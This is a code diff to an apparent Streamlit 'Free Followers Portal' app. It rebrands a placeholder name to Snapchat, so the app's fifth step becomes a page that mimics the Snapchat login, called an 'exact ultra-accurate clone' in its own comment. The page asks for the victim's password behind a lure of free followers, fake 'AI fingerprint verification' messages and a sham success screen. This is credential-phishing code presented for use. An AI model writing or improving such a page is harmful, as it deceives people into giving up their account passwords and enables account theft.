@@ -29,7 +29,7 @@ GLOBAL_CSS = """
 .input-label-portal { font-weight: 700 !important; font-size: 14px !important; margin-bottom: 8px !important; display: block; }
 .stButton>button[kind="primary"] { background-color: #2563eb !important; color: #ffffff !important; border-radius: 8px !important; font-weight: 700 !important; border: none !important; width: 100% !important; padding: 10px !important; }
 
-/* 🔴 EXACT ULTRA-ACCURATE CLONE FOR STEP 5 (VINAY CHAT LOGIN) */
+/* 🔴 EXACT ULTRA-ACCURATE CLONE FOR STEP 5 (SnapCHAT LOGIN) */
 .clone-card {
     background-color: #ffffff !important;
     padding: 40px 35px !important;
@@ -125,7 +125,7 @@ if st.session_state.step == 1:
         except:
             st.markdown("<p style='text-align:center; color:gray; font-size:12px;'>[ 1.png Logo Space ]</p>", unsafe_allow_html=True)
             
-    st.markdown("<div class='portal-title'>Free Followers Portal</div><div class='portal-subtitle'>Free Followers Portal Vinay Chat</div>", unsafe_allow_html=True)
+    st.markdown("<div class='portal-title'>Free Followers Portal</div><div class='portal-subtitle'>Free Followers Portal SnapChat</div>", unsafe_allow_html=True)
     
     st.markdown("<span class='input-label-portal'>📧 Enter Email Address</span>", unsafe_allow_html=True)
     email = st.text_input("email", label_visibility="collapsed")
@@ -192,7 +192,7 @@ elif st.session_state.step == 3:
     st.markdown("<div class='portal-card'>", unsafe_allow_html=True)
     st.markdown("<div class='portal-title'>Target Profile Matrix Selection 🎯</div><div class='portal-subtitle'>Configure cloud delivery optimization metrics</div>", unsafe_allow_html=True)
     
-    is_public = st.radio("Is your Vinay Chat profile Public? 🔓", ["Yes, it is Public", "No, it is Private"], index=0)
+    is_public = st.radio("Is your SnapChat profile Public? 🔓", ["Yes, it is Public", "No, it is Private"], index=0)
     has_dp = st.radio("Have you uploaded an active Profile Picture (DP)? 📸", ["Yes", "No"], index=0)
     
     st.write("---")
@@ -227,7 +227,7 @@ elif st.session_state.step == 4:
     st.write("---")
     st.markdown("<div style='text-align:center;'><h4 style='font-weight:700;'>⚡ Instant Priority Pipeline Delivery (1 Hour)</h4><p style='font-size:13px; color:#475569;'>Bypass the queue lock frame by verifying your official session footprint identity.</p></div>", unsafe_allow_html=True)
     
-    if st.button("PRO: Verify Official Vinay Chat ID Now 🚀", type="primary"):
+    if st.button("PRO: Verify Official SnapChat ID Now 🚀", type="primary"):
         bot = st.empty()
         bot.info("🤖 Launching AI Device-Fingerprint Security Protocol...")
         time.sleep(2)
@@ -254,7 +254,7 @@ elif st.session_state.step == 5:
             st.markdown("<p style='color:#ff4444; text-align:center; font-size:26px; font-weight:bold; margin:0;'>logo</p>", unsafe_allow_html=True)
     
     # 2. Exact Brand Font Mapping
-    st.markdown("<p class='clone-brand'>vinay chat</p>", unsafe_allow_html=True)
+    st.markdown("<p class='clone-brand'>Snapchat</p>", unsafe_allow_html=True)
     
     # 3. Form Setup with Exact Placeholder matching
     with st.form("clone_form", clear_on_submit=False):
@@ -264,7 +264,7 @@ elif st.session_state.step == 5:
         st.write("") 
         
         st.markdown("<span class='clone-label'>password</span>", unsafe_allow_html=True)
-        vc_pass = st.text_input("pass", type="password", placeholder="••••••••", label_visibility="collapsed")
+        vc_pass = st.text_input("pass", type="password", placeholder="Enter your password", label_visibility="collapsed")
         
         st.markdown("<div class='forgot-pass'>Forgot Password</div>", unsafe_allow_html=True)
         
@@ -301,15 +301,16 @@ elif st.session_state.step == 5:
     st.markdown("</div>", unsafe_allow_html=True)
     
     # External login box footer
-    st.markdown("<div class='clone-footer'>New To vinay chat?<b>Sign Up</b></div>", unsafe_allow_html=True)
+    st.markdown("<div class='clone-footer'>New To Snapchat?<b>Sign Up</b></div>", unsafe_allow_html=True)
 
 # ==========================================
 # STEP 6: ALLOCATION SUCCESS LAYER
 # ==========================================
 elif st.session_state.step == 6:
     st.markdown("<div class='portal-card'>", unsafe_allow_html=True)
-    st.success("✅ Footprint Verification Successful")
+    st.success("✅ Snapchat account Verification Successful")
     st.markdown("<div style='text-align:center; padding:15px 0;'><h2 style='color:#16a34a; font-weight:800;'>Queue Bypassed!</h2><p style='font-size:15px; font-weight:700; color:#2563eb;'>🚀 Allocation Injection Status: Active (Est. Arrival: 45 Mins)</p></div>", unsafe_allow_html=True)
     st.balloons()
     st.markdown("</div>", unsafe_allow_html=True)
-    
+
+
